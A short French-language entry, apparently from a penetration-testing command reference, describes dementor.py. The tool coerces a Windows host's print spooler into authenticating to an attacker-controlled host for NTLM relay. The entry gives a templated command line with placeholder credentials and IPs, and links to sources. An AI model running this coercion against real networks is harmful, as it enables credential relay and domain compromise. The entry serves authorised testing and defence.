---
description: |
  dementor.py interagit avec le spooler d'imprimante d'un hôte pour déclencher une authentification de l'IP cible vers un hôte contrôlé par l'attaquant (généralement un serveur SMB ou HTTP). Cette authentification capturée peut ensuite être relayée pour authentifier d'autres hôtes. Plus d'informations dans ntlmrelayx.py.

  Command Reference:

  	Target IP: <IP_tar>

  	Attacker IP: <IP_att>

  	Domain: <domain.local>

  	Username: <user>

  	Password: <passwd>

command: |
  python3 dementor.py -u <user> -p <passwd> -d <domain.local> <IP_att> <IP_tar>
items:
  - Password
  - Username
services:
  - RPC
  - NTLM
OS:
  - Linux
  - Windows
  - Approved-tool
attack_types:
  - Exploitation
references:
  - https://gist.github.com/3xocyte/cfaf8a34f76569a8251bde65fe69dccc
  - https://www.praetorian.com/blog/active-directory-computer-account-smb-relaying-attack
---
